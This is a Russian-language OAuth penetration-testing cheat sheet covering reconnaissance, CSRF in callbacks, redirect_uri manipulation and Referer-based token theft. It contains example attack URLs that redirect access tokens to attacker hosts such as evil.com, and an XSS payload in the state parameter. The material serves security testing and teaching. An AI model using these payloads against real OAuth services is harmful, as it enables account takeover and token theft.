*  [Разведка](#Разведка)
*  [Кража токена OAuth через Referer](#Кража-токена-OAuth-через-Referer)
*  [Перехват токена OAuth через redirect_uri](#Перехват-токена-OAuth-через-redirect_uri)
*  [Выполнение XSS через redirect_uri](#Выполнение-XSS-через-redirect_uri)
*  [Раскрытие закрытого ключа OAuth](#Раскрытие-закрытого-ключа-OAuth)
*  [Нарушение правил использования authorization code](#Нарушение-правил-использования-authorization-code)
*  [Межсайтовая подделка запроса (CSRF)](#Межсайтовая-подделка-запроса-CSRF)

# Разведка
> Если используется внешняя служба OAuth, необходимо идентифицировать конкретного провайдера по имени хоста, на который отправляется запрос на авторизацию.

Узнав имя хоста сервера авторизации, вы всегда должны попытаться отправить запрос GET на следующие стандартные конечные точки:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```
Они часто возвращают файл конфигурации JSON, содержащий ключевую информацию, например, подробности дополнительных функций, которые могут поддерживаться


# Уязвимости в клиентском приложении OAuth
> Спецификация OAuth определена относительно слабо. Это особенно верно в отношении реализации клиентским приложением. В потоке OAuth много подвижных частей, с большим количеством необязательных параметров и настроек конфигурации в каждом типе предоставления, что означает, что есть много возможностей для неправильных конфигураций.
___________
## Неправильная реализация неявного типа предоставления

> Из-за опасностей, возникающих при отправке токенов доступа через браузер, неявный тип предоставления в основном рекомендуется для одностраничных приложений. Однако он также часто используется в классических клиент-серверных веб-приложениях из-за своей относительной простоты.

* Токен доступа отправляется из службы OAuth в клиентское приложение через браузер пользователя в виде фрагмента URL. 
* Клиентское приложение получает доступ к токену с помощью JavaScript.

> Проблема в том, что если приложение хочет сохранить сеанс после того, как пользователь закрывает страницу, ему необходимо где-то сохранить текущие данные пользователя (обычно идентификатор пользователя и токен доступа).

* Клиентское приложение часто отправляет эти данные на сервер в запросе POST, а затем назначает пользователю сеансовый cookie, фактически регистрируя его.
> Этот запрос примерно эквивалентен запросу отправки формы, который может быть отправлен как часть классического входа на основе пароля. Однако в этом сценарии у сервера нет никаких секретов или паролей для сравнения с отправленными данными, что означает, что он неявно доверен.

Если клиентское приложение не проверит должным образом, что токен доступа соответствует другим данным в запросе. В этом случае пользователь может просто изменить параметры, отправленные на сервер, чтобы выдать себя за любого пользователя.
________
## Межсайтовая подделка запроса (CSRF)

Приложения, которые не проверяют наличие действительного CSRF-токена в OAuth callback, уязвимы. Это можно эксплуатировать, инициировав OAuth-поток и перехватив callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). Этот URL можно использовать в CSRF-атаках.

> Клиент ДОЛЖЕН реализовать защиту от CSRF для своего URI перенаправления (`redirection URI`). Обычно это достигается путем требования, чтобы любой запрос, отправленный на конечную точку URI перенаправления, включал значение, которое привязывает запрос к аутентифицированному состоянию пользовательского агента. Клиенту СЛЕДУЕТ использовать параметр запроса `state` для передачи этого значения серверу авторизации при выполнении запроса на авторизацию.

________
# Уязвимости в службе OAuth
________
## Утечка кодов авторизации и токенов доступа

В зависимости от типа гранта, либо код, либо токен отправляется через браузер жертвы на конечную точку /callback, указанную в параметре redirect_uri запроса авторизации. Если служба OAuth не может должным образом проверить этот URI, злоумышленник может сконструировать атаку, подобную CSRF, обманом заставив браузер жертвы инициировать поток OAuth, который отправит код или токен на контролируемый злоумышленником redirect_uri.

В случае потока кода авторизации:
* украсть код жертвы до его использования.
* отправить этот код на законную конечную точку /callback клиентского приложения (исходный redirect_uri), чтобы получить доступ к учетной записи пользователя.
> В этом сценарии даже не нужно знать секрет клиента или полученный токен доступа. Пока есть действительный сеанс со службой OAuth, клиентское приложение просто завершит обмен кодом/токеном от имени злоумышленника, прежде чем войти в учетную запись.

> использование защиты состояния или одноразового кода не обязательно предотвращает эти атаки, поскольку злоумышленник может генерировать новые значения из своего собственного браузера.

Более безопасные серверы авторизации также потребуют отправки параметра redirect_uri при обмене кодом. Затем сервер может проверить, совпадает ли он с полученным в первоначальном запросе авторизации, и отклонить обмен, если нет. Поскольку это происходит в запросах от сервера к серверу через защищенный обратный канал, злоумышленник не может контролировать этот второй параметр redirect_uri.
________
### Некорректная проверка redirect_uri
> При аудите потока OAuth следует попробовать поэкспериментировать с параметром redirect_uri, чтобы понять, как он проверяется:




________














# Кража токена OAuth через Referer

> У вас есть HTML-инъекция, но не получается выполнить XSS? На сайте есть реализации OAuth? Если да, настройте тег `img` на свой сервер и посмотрите, есть ли способ заставить пользователя перейти туда (редирект и т.д.) после входа в систему, чтобы украсть OAuth-токены через заголовок referer.
________
# Перехват токена OAuth через `redirect_uri`

**Перенаправление на контролируемый домен для получения access token**
```python
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

**Перенаправление на разрешенный Open URL для получения access token**
```python
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

> Реализации OAuth никогда не должны разрешать (whitelist) целые домены, а только конкретные URL-адреса, чтобы `redirect_uri` нельзя было указать на открытый редирект (Open Redirect).

Иногда необходимо изменить область видимости (`scope`) на недопустимую, чтобы обойти фильтр на `redirect_uri`:
```python
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```
________
# Выполнение XSS через `redirect_uri`
```python
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

# Раскрытие закрытого ключа OAuth
Некоторые приложения для Android/iOS можно декомпилировать, и закрытый ключ OAuth может быть доступен.
________
# Нарушение правил использования authorization code
> **Клиент НЕ ДОЛЖЕН использовать код авторизации более одного раза.**

Если код авторизации используется более одного раза, сервер авторизации ДОЛЖЕН отклонить запрос и (по возможности) ДОЛЖЕН отозвать все токены, ранее выданные на основе этого кода авторизации.
________
